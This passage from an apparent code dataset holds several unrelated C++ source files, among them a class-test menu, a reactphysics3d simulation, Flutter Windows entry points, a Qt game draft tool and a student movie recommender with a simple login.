switch(options[i])\n            {\n                case '\\t':   cout << \"[Tab] \";   break;\t\t\t\t\t// \u9009\u9879\u4e2d\u7684Tab\u5b57\u7b26'\\t'\uff08\u5373ASCII\u7f16\u78019\uff09\n                case '\\x1b': cout << \"[Esc] \";   break;\t\t\t\t\t// \u9009\u9879\u4e2d\u7684Esc\u5b57\u7b26'\\x1b'\uff08\u5373ASCII\u7f16\u780127\uff09\n                case ' ':    cout << \"[Space] \"; break;\t\t\t\t\t// \u9009\u9879\u4e2d\u7684\u7a7a\u683c\u5b57\u7b26' '\uff08\u5373ASCII\u7f16\u780132\uff09\n            }\n        }\n    }\n    cout << \"\\b}: \";\t\t\t\t\t// '\\b'\u9000\u683c\u3002\u5148\u9000\u4e00\u683c\uff0c\u5728\u8f93\u51fa\u53f3\u82b1\u62ec\u53f7\n    do\n    {\n        key = getch();\n    }while(options[0]!='\\0' && Pos(key, options)<0); // \u82e5options\u4e3a\u7a7a\u957f\u5ea6\u4e3a0\u7684\u5b57\u7b26\u4e32\uff0c\u5219\u8f93\u5165\u65e0\u9650\u5236\uff1b\u5426\u5219\u8f93\u5165\u9879\u5e94\u8be5\u5728optins\u4e2d\u3002\n    cout << endl;\n    return key;\n}\n\nint main() {\n    void testStringClass(), testVectorClass(), testderivedstring(), testDiversity1(), testDiversity2();\n    int key;\n    while(true)\n    {\n        cout << \"\u62bd\u8c61\u5411\u91cf\u7c7b\u6a21\u677f\u6d3e\u751f\u548c\u591a\u6001\u6d4b\u8bd5\" << endl;\n        cout << \"1 --- \u5411\u91cf\u7c7b\u6a21\u7248\u6d4b\u8bd5\" << endl;\n        cout << \"2 --- \u5b57\u7b26\u7c7b\u6d4b\u8bd5\" << endl;\n        cout << \"3 --- \u5b57\u7b26\u7c7b\u6d3e\u751f\u6d4b\u8bd5\" << endl;\n        cout << \"4 --- \u5b57\u7b26\u7c7b\u591a\u6001\u6d4b\u8bd5\" << endl;\n        cout << \"5 --- \u5411\u91cf\u7c7b\u591a\u6001\u6d4b\u8bd5\" << endl;\n        key = Choice(\"\\n\u8bf7\u9009\u62e9\", \"12345\\x1b\");\n        cout << \"\\n\\n\";\n        if(key==27)\t\t// '\\x1b'\u7b49\u4e8e27\uff0c\u6307ESC\u952e\n            break;\n        switch(key)\n        {\n            case '1':\ttestVectorClass();\t\t\t    break;\n            case '2':\ttestStringClass();\t            break;\n            case '3':\ttestderivedstring();\t\t\tbreak;\n            case '4':\ttestDiversity1();\t\t\tbreak;\n            case '5':\ttestDiversity2();\t\t\tbreak;\n        }\n    }\n    return 0;\n}",
    "#include <reactphysics3d/reactphysics3d.h>\n#include <vector>\n#include <iostream>\n// test area information\n#define x_length 2000.0f\n#define y_length 1500.0f\n#define z_length 2000.0f\n#define thickness 10.0f\n#define ticks_per_second (480.0f)\n#define tick_period (1.0f / (ticks_per_second))\n// helper macro for simulation time control\n#define ticks_to_simulate(time) ((time) / (tick_period))\n#define x_bodys 50\n#define z_bodys x_bodys\nnamespace rp3d = reactphysics3d;\nrp3d::decimal time_step = 1.0f / ticks_per_second;\nrp3d::RigidBody *create_test_area(rp3d::PhysicsCommon &engine, rp3d::PhysicsWorld *w)\n{\n    rp3d::Transform ground_body_transform = rp3d::Transform::identity();\n    rp3d::RigidBody *ground = w->createRigidBody(ground_body_transform);\n    ground->setType(rp3d::BodyType::STATIC);\n    rp3d::BoxShape *ceiling_ground_shape = engine.createBoxShape(rp3d::Vector3(x_length / 2, thickness / 2, z_length / 2));\n    rp3d::Transform ground_shape_transform(rp3d::Vector3(0, -(thickness / 2), 0), rp3d::Quaternion::identity());\n    ground->addCollider(ceiling_ground_shape, ground_shape_transform);\n    rp3d::Transform ceiling_shape_transform(rp3d::Vector3(0, y_length + (thickness / 2), 0), rp3d::Quaternion::identity());\n    ground->addCollider(ceiling_ground_shape, ceiling_shape_transform);\n    rp3d::BoxShape *left_right_shape = engine.createBoxShape(rp3d::Vector3(thickness / 2, y_length / 2, z_length / 2));\n    rp3d::Transform left_shape_transform(rp3d::Vector3(-(x_length + thickness) / 2, 0, 0), rp3d::Quaternion::identity());\n    ground->addCollider(left_right_shape, left_shape_transform);\n    rp3d::Transform right_shape_transform(rp3d::Vector3((x_length + thickness) / 2, 0, 0), rp3d::Quaternion::identity());\n    ground->addCollider(left_right_shape, right_shape_transform);\n    rp3d::BoxShape *front_back_shape = engine.createBoxShape(rp3d::Vector3(x_length / 2, y_length / 2, thickness / 2));\n    rp3d::Transform front_shape_transform(rp3d::Vector3(0, 0, (z_length + thickness) / 2), rp3d::Quaternion::identity());\n    ground->addCollider(front_back_shape, front_shape_transform);\n    rp3d::Transform back_shape_transform(rp3d::Vector3(0, 0, -(z_length + thickness) / 2), rp3d::Quaternion::identity());\n    ground->addCollider(front_back_shape, back_shape_transform);\n    return ground;\n}\nstd::vector<rp3d::RigidBody *> create_bodys_to_simulate(rp3d::PhysicsCommon &engine, rp3d::PhysicsWorld *w)\n{\n    std::vector<rp3d::RigidBody *> bodys;\n    rp3d::decimal body_size = std::min(x_length / x_bodys, z_length / z_bodys);\n    int body_count = 0;\n    rp3d::SphereShape *body_shape = engine.createSphereShape(body_size / 2);\n    rp3d::decimal y = y_length - body_size / 2;\n    rp3d::Transform shape_transform = rp3d::Transform::identity();\n    for (rp3d::decimal z = -(z_length - body_size) / 2; z <= (z_length - body_size) / 2; z += body_size)\n    {\n        for (rp3d::decimal x = -(x_length - body_size) / 2; x <= (x_length - body_size) / 2; x += body_size)\n        {\n            rp3d::RigidBody *body = w->createRigidBody(rp3d::Transform(rp3d::Vector3(x, y, z), rp3d::Quaternion::identity()));\n            body->addCollider(body_shape, shape_transform);\n            bodys.push_back(body);\n            body_count++;\n        }\n    }\n    std::cout << \"I have just created \" << body_count << \"bodys\" << std::endl;\n    return bodys;\n}\nvoid run_simulation(rp3d::PhysicsWorld *w, rp3d::decimal simulate_time)\n{\n    int ticks = ticks_to_simulate(simulate_time);\n    for (int t = 0; t < ticks; t++)\n    {\n        w->update(tick_period);\n    }\n    std::cout << \"done, I have just run \" << ticks << \" ticks.\" << std::endl;\n}\nint main()\n{\n    rp3d::PhysicsCommon engine;\n    rp3d::PhysicsWorld *w = engine.createPhysicsWorld();\n    create_test_area(engine, w);\n    auto bodys = create_bodys_to_simulate(engine, w);\n    run_simulation(w, 100);\n    std::cout << \"this is the final position of the first created body: (\" << bodys[0]->getTransform().getPosition()[0] << \", \" << bodys[0]->getTransform().getPosition()[1] << \", \" << bodys[0]->getTransform().getPosition()[2] << \").\\n\";\n}",
    "#define o00 #define\r\n#define o01 0\r\n#define o02 O\r\n#define o03 oo\r\n#define o04 OO\r\n#define o05 ooo\r\n#define o06 Oo\r\n#define o07 oO\r\n#define o08 OOo\r\n#define o09 oOO\r\n#define o10 oooO\r\n#define o11 ooO\r\n#define o12 Ooo\r\n#define o13 OoO\r\n#define o14 ooO\r\n#define o15 OOO\r\n#define o16 oOo\r\n#define o17 oooOo\r\n#define o18 OoOo\r\n#define o19 ooOO\r\n#define o20 oOoO\r\n#define o21 ooOo\r\n#define o22 OooO\r\n#define o23 OOOo\r\n#define o24 oOOo\r\n#define o25 ooOOo\r\n#define o26 OoOO\r\n#define o27 ooOoO\r\n#define o28 OooOo\r\n#define o29 OOOOo\r\n#define o30 oOOOo\r\n#define o31 ooOOoO\r\n#define o32 OoOOo\r\n#define o33 ooOoOO\r\n#define o34 OooOoO\r\n#define o35 OOOoOo\r\n#define o36 oOOoOo\r\n#define o37 ooOoOo\r\n#define o38 OoOoOo\r\n#define o39 ooOOoOo\r\n#define o40 OoOOoOo\r\n#define o41 ooOoOoO\r\n#define o42 OooOoOo\r\n#define o43 OOOoOoO\r\n#define o44 oOOoOoO\r\n#define o45 ooOoOoOO\r\n#define o46 OoOoOoO\r\n#define o47 ooOOoOoO\r\n#define o48 OoOOoOoO\r\n#define o49 ooOoOoOo\r\n#define o50 OooOoOoO\r\n#define o51 OOOoOoOo\r\n#define o52 oOOoOoOo\r\n#define o53 ooOoOoOoO\r\n#define o54 OoOoOoOo\r\n#define o55 ooOOoOoOo\r\n#define o56 OoOOoOoOo\r\n#define o57 ooOoOoOoOo\r\n#define o58 OooOoOoOo\r\n#define o59 OOOoOoOoO\r\n#define o60 oOOoOoOoO\r\n#define o61 ooOoOoOoOo\r\n#define o62 OoOoOoOoO\r\n#define o63 ooOOoOoOoO\r\n#define o64 OoOOoOoOoO\r\n#define o65 ooOoOoOoOoO\r\n#define o66 OooOoOoOoO\r\n#define o67 OOOoOoOoOo\r\n#define o68 oOOoOoOoOo\r\n#define o69 ooOoOoOoOoO\r\n#define o70 OoOoOoOoOo\r\n#define o71 ooOOoOoOoOo\r\n#define o72 OoOOoOoOoOo\r\n#define o73 ooOoOoOoOoOo\r\n#define o74 OooOoOoOoOo\r\n#define o75 OOOoOoOoOoO\r\n#define o76 oOOoOoOoOoO\r\n#define o77 ooOoOoOoOoOo\r\n#define o78 OoOoOoOoOoO\r\n#define o79 ooOOoOoOoOoO\r\n#define o80 OoOOoOoOoOoO\r\n#define o81 ooOoOoOoOoOoO\r\n#define o82 OooOoOoOoOoO\r\n#define o83 OOOoOoOoOoOo\r\n#define o84 oOOoOoOoOoOo\r\n#define o85 ooOoOoOoOoOoO\r\n#define o86 OoOoOoOoOoOo\r\n#define o87 ooOOoOoOoOoOo\r\n#define o88 OoOOoOoOoOoOo\r\n#define o89 ooOoOoOoOoOoOo\r\n#define o90 OooOoOoOoOoOo\r\n#define o91 OOOoOoOoOoOoO\r\n#define o92 oOOoOoOoOoOoO\r\n#define o93 ooOoOoOoOoOoOo\r\n#define o94 OoOoOoOoOoOoO\r\n#define o95 ooOOoOoOoOoOoO\r\n#define o96 OoOOoOoOoOoOoO\r\n#define o97 ooOoOoOoOoOoOoO\r\n#define o98 OooOoOoOoOoOoO\r\n#define o99 OOOoOoOoOoOoOo\r\n#define o100 oOOoOoOoOoOoOo\r\n#define o101 ooOoOoOoOoOoOoO\r\n#define o102 OoOoOoOoOoOoOo\r\n#define o103 ooOOoOoOoOoOoOo\r\n#define o104 OoOOoOoOoOoOoOo\r\n#define o105 ooOoOoOoOoOoOoOo\r\n#define o106 OooOoOoOoOoOoOo\r\n#define o107 OOOoOoOoOoOoOoO\r\n#define o108 oOOoOoOoOoOoOoO\r\n#define o109 ooOoOoOoOoOoOoOo\r\n#define o110 OoOoOoOoOoOoOoO\r\n#define o111 ooOOoOoOoOoOoOoO\r\n#define o112 OoOOoOoOoOoOoOoO\r\n#define o113 ooOoOoOoOoOoOoOoO\r\n#define o114 OooOoOoOoOoOoOoO\r\n#define o115 OOOoOoOoOoOoOoOo\r\n#define o116 oOOoOoOoOoOoOoOo\r\n#define o117 ooOoOoOoOoOoOoOoO\r\n#define o118 OoOoOoOoOoOoOoOo\r\n#define o119 ooOOoOoOoOoOoOoOo\r\n#define o120 OoOOoOoOoOoOoOoOo\r\n#define o121 ooOoOoOoOoOoOoOoOo\r\n#define o122 OooOoOoOoOoOoOoOo\r\n#define o123 OOOoOoOoOoOoOoOoO\r\n#define o124 oOOoOoOoOoOoOoOoO\r\n#define o125 ooOoOoOoOoOoOoOoOo\r\n#define o126 OoOoOoOoOoOoOoOoO\r\n#define o127 ooOOoOoOoOoOoOoOoO\r\n#define o128 OoOOoOoOoOoOoOoOoO\r\n#define o129 ooOoOoOoOoOoOoOoOoO\r\n#define o130 OooOoOoOoOoOoOoOoO\r\n#define o131 OOOoOoOoOoOoOoOo",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"robot_control_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"main\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Node {\n    int data;\n    struct Node *next;\n\n    Node(int x) {\n        data = x;\n        next = NULL;\n    }\n};\nclass Solution {\n  public:\n    int sumOfLastN_Nodes(struct Node* head, int n) {\n        int sum=0;\n        Node* curr=head;\n        for( ;curr!=NULL && n>0;curr=curr->next){\n            sum += curr->data;\n            n--;\n        }\n        Node* lnode=head;\n        \n        while(curr!=NULL){\n            sum +=curr->data;\n            curr=curr->next;\n            sum -=lnode->data;\n            lnode=lnode->next;\n        }\n        return sum;\n    }\n};\n\nint main() {\n    int t;\n    cin >> t;\n    cin.ignore();\n    while (t--) {\n        vector<int> arr;\n        string input;\n        getline(cin, input);\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n        int n;\n        cin >> n;\n        cin.ignore();\n        struct Node *head = new Node(arr[0]);\n        struct Node *tail = head;\n        for (int i = 1; i < arr.size(); ++i) {\n            tail->next = new Node(arr[i]);\n            tail = tail->next;\n        }\n        Solution ob;\n        cout << ob.sumOfLastN_Nodes(head, n) << endl;\n    }\n    return 0;\n}",
    "\ufeff#include \"banpicktool.h\"\n#include <QVBoxLayout>\n#include <QHBoxLayout>\n\nBanPickTool::BanPickTool(QWidget* parent)\n    : QMainWindow(parent), currentTeam(\"Team1\"), currentOperationIndex(0) {\n    champions = {\n        Champion(\"\u963f\u57fa\u5766\u7684\u57c3\u8389\u8bfa \u6cd5\u56fd(\u7231\u6cd5)\"),\n        Champion(\"\u963f\u57fa\u5766\u7684\u57c3\u8389\u8bfa \u82f1\u56fd(\u7231\u82f1)\"),\n        Champion(\"\u963f\u66fc\u5c3c\u6258\u5c14(\u52aa\u6bd4\u4e9a)\"),\n        Champion(\"\u5b89\u6bd4\u5965\u91cc\u514b\u65af(\u9ad8\u5362)\"),\n        Champion(\"\u5df4\u5c14\u5179\u4e8c\u4e16(\u7537\u62dc)\"),\n        Champion(\"\u5317\u6761\u65f6\u5b97(\u65e7\u65e5\u672c)\"),\n        Champion(\"\u5f7c\u5f97(\u4fc4\u7f57\u65af)\"),\n        Champion(\"\u4f2f\u91cc\u514b\u5229(\u7537\u5e0c\u814a)\"),\n        Champion(\"\u6210\u5409\u601d\u6c57(\u6b66\u8499\u53e4)\"),\n        Champion(\"\u5fb7\u5ddd\u5bb6\u5eb7(\u65b0\u65e5\u672c)\"),\n        Champion(\"\u72c4\u5965\u591a\u62c9(\u5973\u62dc)\"),\n        Champion(\"\u72c4\u591a(\u8153\u5c3c\u57fa)\"),\n        Champion(\"\u9607\u8036\u8dcb\u6469\u4e03\u4e16(\u9ad8\u68c9)\"),\n        Champion(\"\u6069\u6d25\u52a0 \u59c6\u73ed\u5fb7(\u5973\u521a\u679c)\"),\n        Champion(\"\u83f2\u5229\u666e\u4e8c\u4e16(\u897f\u73ed\u7259)\"),\n        Champion(\"\u5f17\u96f7\u5fb7\u91cc\u514b \u5df4\u5df4\u7f57\u8428(\u6b66\u5fb7)\"),\n        Champion(\"\u7518\u5730(\u6587\u5370\u5ea6)\"),\n        Champion(\"\u6208\u5c14\u6208(\u5973\u5e0c\u814a)\"),\n        Champion(\"\u54c8\u62c9\u5c14\u5fb7 \u54c8\u5fb7\u62c9\u8fbe \u5317\u5883\u738b(\u65e7\u632a\u5a01)\"),\n        Champion(\"\u54c8\u62c9\u5c14\u5fb7 \u54c8\u5fb7\u62c9\u8fbe \u74e6\u826f\u683c(\u65b0\u632a\u5a01)\"),\n        Champion(\"\u6c49\u8c1f\u62c9\u6bd4(\u5df4\u6bd4\u4f26)\"),\n        Champion(\"\u5ffd\u5fc5\u70c8 \u8499\u53e4(\u6587\u8499\u53e4)\"),\n        Champion(\"\u5ffd\u5fc5\u70c8 \u4e2d\u56fd(\u5ffd\u4e2d)\"),\n        Champion(\"\u5409\u5c14\u4f3d\u7f8e\u4ec0(\u95ea\u95ea)\"),\n        Champion(\"\u5c45\u9c81\u58eb(\u65e7\u6ce2\u65af)\"),\n        Champion(\"\u51ef\u745f\u7433 \u5fb7 \u7f8e\u7b2c\u5947 \u9ed1\u738b\u540e(\u9ed1\u6cd5)\"),\n        Champion(\"\u51ef\u745f\u7433 \u5fb7 \u7f8e\u7b2c\u5947 \u5bfb\u6b22\u4f5c\u4e50(\u767d\u6cd5)\"),\n        Champion(\"\u514b\u91cc\u65af\u8482\u5a1c(\u745e\u5178)\"),\n        Champion(\"\u514b\u91cc\u6b27\u4f69\u7279\u62c9 \u57c3\u53ca(\u65e7\u8273\u540e)\"),\n        Champion(\"\u514b\u91cc\u6b27\u4f69\u7279\u62c9 \u6258\u52d2\u5bc6(\u65b0\u8273\u540e)\"),\n        Champion(\"\u5e93\u4f69(\u6bdb\u5229)\"),\n        Champion(\"\u62c9\u7f8e\u897f\u65af\u4e8c\u4e16(\u62c9\u4e8c)\"),\n        Champion(\"\u83b1\u592b\u624e\u8339(\u9a6c\u666e\u5207)\"),\n        Champion(\"\u516d\u65e5\u592b\u4eba(\u739b\u96c5)\"),\n        Champion(\"\u8def\u5fb7\u7ef4\u5e0c\u4e8c\u4e16(\u6587\u5fb7)\"),\n        Champion(\"\u7f57\u4f2f\u7279\u4e00\u4e16(\u82cf\u683c\u5170)\"),\n        Champion(\"\u66fc\u6c99 \u7a46\u8428(\u94b1\u9a6c\u91cc)\"),\n        Champion(\"\u8499\u7279\u7956\u9a6c(\u963f\u5179\u7279\u514b)\"),\n        Champion(\"\u5b5f\u5c3c\u5229\u514b\u4e8c\u4e16(\u57c3\u585e)\"),\n        Champion(\"\u59c6\u672c\u5df4 \u6069\u6d25\u52a0(\u7537\u521a\u679c)\"),\n        Champion(\"\u7eb3\u8fea\u5c14\u6c99\u963f(\u65b0\u6ce2\u65af)\"),\n        Champion(\"\u5e15\u67e5\u5e93\u7279\u514b(\u5370\u52a0)\"),\n        Champion(\"\u5e9e\u5fb7\u6885\u514b(\u514b\u91cc)\"),\n        Champion(\"\u4f69\u5fb7\u7f57\u4e8c\u4e16(\u5df4\u897f)\"),\n        Champion(\"\u6070\u5361(\u7956\u9c81)\"),\n        Champion(\"\u79e6\u59cb\u7687 \u5927\u7edf\u4e00(\u6b66\u79e6)\"),\n        Champion(\"\u79e6\u59cb\u7687 \u5929\u547d\u8005(\u6587\u79e6)\"),\n        Champion(\"\u82e5\u6602\u4e09\u4e16(\u8461\u8404\u7259)\"),\n        Champion(\"\u8428\u62c9\u4e01 \u82cf\u4e39(\u6b66\u963f\u62c9\u4f2f)\"),\n        Champion(\"\u8428\u62c9\u4e01 \u7ef4\u9f50\u5c14(\u6587\u963f\u62c9\u4f2f)\"),\n        Champion(\"\u5584\u5fb7(\u5973\u671d\u9c9c)\"),\n        Champion(\"\u4e16\u5b97\u5927\u738b(\u7537\u671d\u9c9c)\"),\n        Champion(\"\u677e\u8fea\u4e9a\u5854 \u51ef\u5854(\u4e66\u9a6c\u91cc)\"),\n        Champion(\"\u82cf\u83b1\u66fc\u4e00\u4e16 \u5927\u5e1d(\u5927\u5e1d)\"),\n        Champion(\"\u82cf\u83b1\u66fc\u4e00\u4e16 \u7acb\u6cd5\u8005(\u4eb2\u5175)\"),\n        Champion(\"\u5854\u739b\u4e3d(\u5899\u59d0)\"),\n        Champion(\"\u6cf0\u8fea \u7f57\u65af\u798f \u8fdb\u6b65\u515a(\u6587\u7f8e)\"),\n        Champion(\"\u6cf0\u8fea \u7f57\u65af\u798f \u83bd\u9a91\u5175(\u6b66\u7f8e)\"),\n        Champion(\"\u7279\u4e3d\u5e03\u74e6\u5a1c(\u5370\u5c3c)\"),\n        Champion(\"\u56fe\u62c9\u771f(\u65e7\u7f57\u9a6c)\"),\n        Champion(\"\u6258\u7c73\u4e3d\u65af(\u65af\u57fa\u6cf0\uff09\"),\n        Champion(\"\u5a01\u5c14\u5f17\u91cc\u5fb7 \u52b3\u96f7\u5c14(\u52a0\u62ff\u5927)\"),\n        Champion(\"\u5a01\u5ec9\u660e\u5a1c(\u8377\u5170)\"),\n        Champion(\"\u7ef4\u591a\u5229\u4e9a \u5e1d\u56fd\u65f6\u4ee3(\u5e1d\u82f1)\"),\n        Champion(\"\u7ef4\u591a\u5229\u4e9a \u84b8\u6c7d\u65f6\u4ee3(\u84b8\u82f1)\"),\n        Champion(\"\u6b66\u5219\u5929(\u6b66\u5219\u5929)\"),\n        Champion(\"\u897f\u8499 \u73bb\u5229\u74e6\u5c14(\u5927\u54e5)\"),\n        Champion(\"\u5308\u96c5\u63d0 \u9a6c\u52a0\u4ec0(\u5308\u7259\u5229)\"),\n        Champion(\"\u96c5\u5fb7\u7ef4\u52a0(\u6ce2\u5170)\"),\n        Champion(\"\u7ef4\u591a\u5229\u4e9a \u84b8\u6c7d\u65f6\u4ee3(\u84b8\u82f1)\"),\n        Champion(\"\u4e9a\u4f2f\u62c9\u7f55 \u6797\u80af(\u6797\u80af)\"),\n        Champion(\"\u4e9a\u5386\u5c71\u5927(\u9a6c\u5176\u987f)\"),\n        Champion(\"\u4f0a\u4e3d\u838e\u767d\u4e00\u4e16(\u5546\u82f1)\"),\n        Champion(\"\u6c38\u4e50\u7687\u5e1d(\u6731\u68e3)\"),\n        Champion(\"\u5c24\u5229\u4e4c\u65af \u51ef\u6492(\u65b0\u7f57\u9a6c)\"),\n        Champion(\"\u7ea6\u7ff0 \u79d1\u5ef7(\u571f\u6fb3)\"),\n        Champion(\"\u65c3\u9640\u7f57\u7b08\u591a(\u6b66\u5370\u5ea6)\"),\n        Champion(\"\u8d75\u592b\u4eba(\u8d8a\u5357)\")\n    };\n\n    operationSequence << \"Team1BAN\" << \"Team1BAN\" << \"Team1BAN\"\n        << \"Team2BAN\" << \"Team2BAN\" << \"Team2BAN\"\n        << \"Team1PICK\" << \"Team1PICK\"\n        << \"Team2PICK\" << \"Team2PICK\"\n        << \"Team1PICK\" << \"Team2PICK\"\n        << \"Team1BAN\" << \"Team1BAN\"\n        << \"Team2BAN\" << \"Team2BAN\"\n        << \"Team1PICK\" << \"Team2PICK\"\n        << \"Team1PICK\" << \"Team2PICK\"<<\"END\";\n\n\n    QWidget* centralWidget = new QWidget(this);\n    setCentralWidget(centralWidget);\n\n    championListWidget = new QListWidget(this);\n    statusLabel = new QLabel(this);\n\n    banButton = new QPushButton(\"Ban\", this);\n    pickButton = new QPushButton(\"Pick\", this);\n    showButton = new QPushButton(\"Over\", this);\n    statusLabel->setText(\"\u6b22\u8fce\u4f7f\u7528CN Civ Banpicktool!\");\n\n    QVBoxLayout* layout = new QVBoxLayout(centralWidget);\n    layout->addWidget(new QLabel(\"Available Champions:\"));\n    layout->addWidget(championListWidget);\n    layout->addWidget(banButton);\n    layout->addWidget(pickButton);\n    layout->addWidget(showButton);\n    layout->addWidget(statusLabel);\n\n    connect(banButton, &QPushButton::clicked, this, &BanPickTool::banChampion);\n    connect(pickButton, &QPushButton::clicked, this, &BanPickTool::pickChampion);\n    connect(showButton, &QPushButton::clicked, this, &BanPickTool::showFinalResults);\n\n    updateChampionList();\n}\n\nBanPickTool::~BanPickTool() {}\n\nvoid BanPickTool::updateChampionList() {\n    championListWidget->clear();\n    for (const auto& champion : champions) {\n        QString displayText;\n        if (champion.isBanned) {\n            displayText = '[' + champion.bannedBy + \" Banned]: \" + champion.name;\n        }\n        else if (champion.isPicked) {\n            displayText = '[' + champion.pickedBy + \" Picked]: \" + champion.name;\n        }\n        else {\n            displayText = \"[Available] \" + champion.name;\n        }\n        championListWidget->addItem(displayText);\n    }\n}\n\n\nvoid BanPickTool::banChampion() {\n    if (currentOperationIndex < operationSequence.size()-1) {\n        QString currentOperation = operationSequence[currentOperationIndex];\n\n        if (currentOperation.startsWith(\"Team1\") && currentOperation.contains(\"BAN\")) {\n            currentTeam = \"Team1\";\n            \n            QListWidgetItem* sele",
    "#include \"scenemanager.h\"\n#include \"mainwindow.h\"\n#include <QWidget>\n#include <QDebug>\n#include <QLayout>\n#include \"Scenes/startscene.h\"\n#include \"Scenes/playing.h\"\n\n\nSceneManager::SceneManager(QWidget *parent)\n    : QWidget{parent}\n{\n    SceneManager::instance = this;\n    // //\u5728\u8fd9\u91cc\u521b\u5efa\u6240\u6709\u7684\u573a\u666f\n    // addScene(0,new StartScene());\n    // addScene(1,new Playing(false));\n    // addScene(2,new Playing(true));\n    //\u8bbe\u7f6e\u521d\u59cb\u573a\u666f\n    switchToScene(0);\n}\n\nSceneManager* SceneManager::instance = nullptr;\n\nQWidget* SceneManager::addSceneToMainQWidget(QWidget *scene) {\n\n\n    QWidget* centralWidget = MainWindow::instance->centralWidget();\n    scene->setParent(centralWidget);\n    centralWidget->layout()->addWidget(scene);\n    return scene;\n}\n\nvoid SceneManager::switchToScene(const int num) {\n    if (currentScene) {\n        delete currentScene;\n    }\n    switch (num) {\n    case 0:\n        currentScene = addSceneToMainQWidget(new StartScene());\n        break;\n    case 1:\n        currentScene = addSceneToMainQWidget(new Playing(false));\n        break;\n    case 2:\n        currentScene = addSceneToMainQWidget(new Playing(true));\n        break;\n    default:\n        qDebug() << \"Illegal scene number.\\n\";\n        break;\n    }\n\n    qDebug() << \"Change to scene \" << num;\n    currentScene->show();\n}\n\n",
    "#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <queue>\r\n\r\nusing namespace std;\r\n\r\n//GLOBAL\r\nint secondUserChoice; // Variable for cin (in nested conditions in functions)\r\nqueue<string> userMovieQueue; //For queue in USER LIST\r\n\r\n// Define a structure to represent a movie\r\nstruct Movie {\r\n    string title;\r\n    string genre;\r\n    string trope;\r\n    string stars;\r\n};\r\n\r\n// Sorting and Searching Technique\r\nvoid merge(Movie* arr, int left, int mid, int right);\r\nvoid mergeSort(Movie* arr, int left, int right);\r\nint findGenreIndex(const string& selectedGenre, const string* genres, int numGenres);\r\n\r\n// Function prototypes\r\nvoid home();\r\nvoid userList();\r\nvoid chooseGenres();\r\nvoid chooseTropes(const string& selectedGenre);\r\nvoid displayMoviesBasedOnTrope(const string& selectedGenre, int tropeChoice);\r\n\r\n// Function for error handlings para iwas redundancy\r\nvoid goodbyeExit();\r\n\r\n//LOG IN\r\nclass userLog {\r\npublic:\r\n    string username;\r\n    string password;\r\n    int age;\r\n\r\n    userLog() {};\r\n\r\n    userLog(string uname, string pwd, int userAge) {\r\n        username = uname;\r\n        password = pwd;\r\n        age = userAge;\r\n    }\r\n};\r\n\r\nclass userManagement {\r\nprivate:\r\n    userLog currentUser;\r\n\r\npublic:\r\n    userManagement(string uname, string pwd, int userAge) {\r\n        currentUser = userLog(uname, pwd, userAge);\r\n    }\r\n\r\n    bool logIn(string uname, string pwd, int userAge) {\r\n        if (uname == currentUser.username && pwd == currentUser.password && userAge >= 18) {\r\n            return true;\r\n        }\r\n        else if (userAge < 18) {\r\n            cout << endl;\r\n            cout << \"    ======================================================\" << endl;\r\n            cout << \"    ||                                                  ||\" << endl;\r\n            cout << \"    || Sorry, you are not eligible to use this program. ||\" << endl;\r\n            cout << \"    || We'll try and come up a better program for you!! ||\" << endl;\r\n            cout << \"    ||                                                  ||\" << endl;\r\n            cout << \"    ======================================================\" << endl;\r\n            exit(0);\r\n            return false;\r\n        }\r\n        else {\r\n            cout << endl << endl;\r\n            cout << \"    ======================================================\" << endl;\r\n            cout << \"    ||  Invalid Username or Password. Please try again. ||\" << endl;\r\n            cout << \"    ======================================================\" << endl;\r\n            return false;\r\n        }\r\n    }\r\n};\r\n\r\n// Storage of information using array\r\nconst int numGenres = 5;\r\nconst string genres[numGenres] = { \"Action\", \"Comedy\", \"Drama\", \"Romance\", \"Science Fiction\" };\r\n\r\nconst int numTropes = 5;\r\nstring tropes[5][numTropes] = {\r\n  